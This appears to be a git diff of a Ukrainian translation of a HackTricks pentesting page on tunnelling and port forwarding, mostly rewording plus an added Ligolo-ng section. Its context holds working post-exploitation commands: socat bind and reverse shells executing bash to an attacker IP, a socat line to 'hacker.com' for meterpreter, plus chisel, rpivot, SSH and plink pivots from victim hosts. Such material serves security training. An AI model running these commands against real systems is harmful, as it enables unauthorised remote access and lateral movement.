@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** та **SYN** сканування не можуть бути тунельовані через сокс-проксі, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+**ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 {% endhint %}
 
 ## **Bash**
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Це корисно для отримання зворотних шелів з внутрішніх хостів через DMZ до вашого хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третій\_бокс:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третя\_коробка:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -207,11 +207,47 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Використовуйте ту ж версію для агента та проксі**
+
+### Тунелювання
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Прив'язка агента та прослуховування
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Зворотний тунель. Тунель починається з жертви.\
+Зворотний тунель. Тунель запускається з жертви.\
 Створюється socks4 проксі на 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -232,12 +268,12 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Прив'язаний шелл
+### Прив'язка оболонки
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Реверс-шелл
+### Зворотний шелл
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -260,7 +296,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Ви можете обійти **неавторизований проксі**, виконавши цю команду замість останньої в консолі жертви:
+Ви можете обійти **неавторизований проксі**, виконавши цей рядок замість останнього в консолі жертви:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -294,9 +330,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
+Це як консольна версія PuTTY (опції дуже схожі на ssh-клієнт).
 
-Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є ssh-клієнтом, нам потрібно відкрити наш ssh-сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -317,10 +353,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Вам потрібно мати **доступ RDP до системи**.\
+Вам потрібно мати **доступ до RDP через систему**.\
 Завантажте:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
@@ -342,14 +378,14 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
+Ви можете налаштувати Windows GUI додатки на навігацію через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
 У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS сервера.\
 У **Профіль -> Правила проксування** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
 
 ## Обхід NTLM проксі
 
 Раніше згадуваний інструмент: **Rpivot**\
-**OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
+**OpenVPN** також може обійти це, встановивши ці параметри в конфігураційному файлі:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -366,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Тепер, якщо ви налаштуєте, наприклад, на жертві сервіс **SSH** для прослуховування на порту 443. Ви можете підключитися до нього через порт атакуючого 2222.\
+Тепер, якщо ви налаштуєте, наприклад, на жертві службу **SSH** для прослуховування на порту 443. Ви можете підключитися до неї через порт атакуючого 2222.\
 Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а атакуючий прослуховує на порту 2222.
 
 ## YARP
@@ -528,7 +564,7 @@ addr: file:///tmp/httpbin/
 <summary>Підтримайте HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
